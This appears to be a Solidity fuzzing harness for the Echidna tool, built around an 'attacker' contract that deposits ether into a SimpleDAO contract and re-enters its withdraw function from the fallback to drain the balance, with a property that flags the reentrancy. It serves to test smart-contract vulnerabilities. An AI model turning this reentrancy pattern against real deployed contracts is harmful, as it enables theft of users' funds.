import "./SimpleDAO.sol";


contract attacker{

    SimpleDAO DAO = new SimpleDAO();
    address a = address(DAO);
	bool flag = false;
	uint256 etherAmount = 1 ether;
	uint256 lastBalance = 0;	


	constructor() public payable{
        depositAll();
	}
	
    function set2(int val1, int val2) public returns(bool){
	    if(val1+val2<=10) flag=true;
    }
    
	function depositAll() private{
		DAO.deposit(address(this).balance);
		address(DAO).transfer(address(this).balance);
	}
	
	function takeEther() public{
		lastBalance = address(this).balance;
	    DAO.withdraw(etherAmount);
	}
	
	function() public payable{
	  if(flag)       DAO.withdraw(DAO.retbalance());
	}

	function echidna_test() public returns (bool) {
		if((lastBalance + etherAmount) < address(this).balance)	return false;
	}
	
}
